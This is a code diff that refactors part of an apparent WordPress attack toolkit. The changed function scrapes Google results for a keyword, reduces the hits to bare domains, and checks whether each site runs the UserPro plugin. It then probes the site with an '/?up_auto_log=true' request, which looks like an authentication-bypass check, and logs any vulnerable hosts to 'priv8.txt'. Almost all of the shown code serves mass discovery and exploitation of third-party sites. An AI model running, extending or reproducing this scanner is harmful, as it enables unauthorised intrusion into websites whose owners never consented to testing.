@@ -134,54 +134,46 @@ def wordpress():
             core.menu.post()
         elif wor == 'set target':
              def tracker(keywords, start):
-                     searchQuery = quote(keywords, safe='')  # This line makes the script Support all encodings
-                     try:
-                         url = "https://www.google.com/search?gl=ir&num=100&start=" + str(
-                             start) + "&pws=0&as_qdr=all&dcr=0&q=" + searchQuery
-                         req = Request(url)  # Sets the SERPs URL!!
-                     except timeout:
-                         print("Connection timed out!")
-                     req.add_header('User-Agent',
-                                    'userpro1 aef by orm')
-                     serpURL = urlopen(req).read()  # Opens and Reads The Serp Page
-                     soup = bs4.BeautifulSoup(serpURL, "html.parser")  # Sets the Serp URL On Soup
-                     allResults = []  # An Empty Array to Save the Results
-                     i=0
-                     for hit in soup.findAll('cite'):  # a for-each loop, to check all <cite ....> Elements in Page
-                           # if the domain was between <cite> and </cite>
-                         allResults.append(
-                               str("")+hit.text)  # Results will add to allResults
-                         i=i+1
-                     if (len(allResults) == 0):
-                         return(""+R+"[!] "+N+"No result found for this keyword => " + keywords)
+                 searchQuery = quote(keywords, safe='')  # This line makes the script Support all encodings
+                 try:
+                     url = "https://www.google.com/search?gl=ir&num=100&start=" + str(
+                         start) + "&pws=0&as_qdr=all&dcr=0&q=" + searchQuery
+                     req = Request(url)  # Sets the SERPs URL!!
+                 except timeout:
+                     print("Connection timed out!")
+                 req.add_header('User-Agent',
+                                'userpro1 aef by orm')
+                 serpURL = urlopen(req).read()  # Opens and Reads The Serp Page
+                 soup = bs4.BeautifulSoup(serpURL, "html.parser")  # Sets the Serp URL On Soup
+                 allResults = [str("")+hit.text for i, hit in enumerate(soup.findAll('cite'))]
+                 if not allResults:
+                     return(""+R+"[!] "+N+"No result found for this keyword => " + keywords)
+                 print(""+B+"[*]"+N+" Ok! Starting... \n")
+
+                 for element in allResults:  # Prints all the results
+                     if (element.startswith("http://")):
+                         element = element[7:]
+                     if (element.startswith("https://")):
+                          element = element[8:]
+                     if (element.startswith("www.")):
+                         element = element[4:]
+                     element=element[:element.find("/")]
+                     element="http://"+element
+                     print("checking "+element+" :")
+                     if (checkwp(element)):
+                         suc = str(checkVul(element))
+                         if ( suc=="True"):
+                             try:
+                                 with open("priv8.txt", mode="a+") as filee:
+                                     filee.write(element+"\n")
+                             except:
+                                 print(""+R+"error"+N+"")
+                             print (suc)
+                         else:
+                             print (""+R+"False"+N+"")
+
                      else:
-                         print(""+B+"[*]"+N+" Ok! Starting... \n")
-
-                         for element in allResults:  # Prints all the results
-                             if (element.startswith("http://")):
-                                 element = element[7:]
-                             if (element.startswith("https://")):
-                                  element = element[8:]
-                             if (element.startswith("www.")):
-                                 element = element[4:]
-                             element=element[:element.find("/")]
-                             element="http://"+element
-                             print("checking "+element+" :")
-                             if (checkwp(element)):
-                                 suc = str(checkVul(element))
-                                 if( suc=="True"):
-                                     try:
-                                         filee = open("priv8.txt", mode="a+")
-                                         filee.write(element+"\n")
-                                         filee.close()
-                                     except:
-                                         print(""+R+"error"+N+"")
-                                     print (suc)
-                                 else:
-                                     print (""+R+"False"+N+"")
-
-                             else:
-                                print (element + ""+R+" =>"+N+" " + str(checkwp(element)))
+                         print (element + ""+R+" =>"+N+" " + str(checkwp(element)))
 
 
              def checkwp(url):
@@ -190,11 +182,11 @@ def wordpress():
                   pURL = urlopen(url).read()
                  except:
                      return False
-                 if (pURL.find(".userpro")>-1):
-                     print (""+B+"[!] "+N+" Plugin is installed checking vulnerable...\n")
-                     return True
-                 else:
+                 if pURL.find(".userpro") <= -1:
                      return False
+
+                 print (""+B+"[!] "+N+" Plugin is installed checking vulnerable...\n")
+                 return True
              def checkVul(url):
                  url1=url + "/?up_auto_log=true"
                  try:
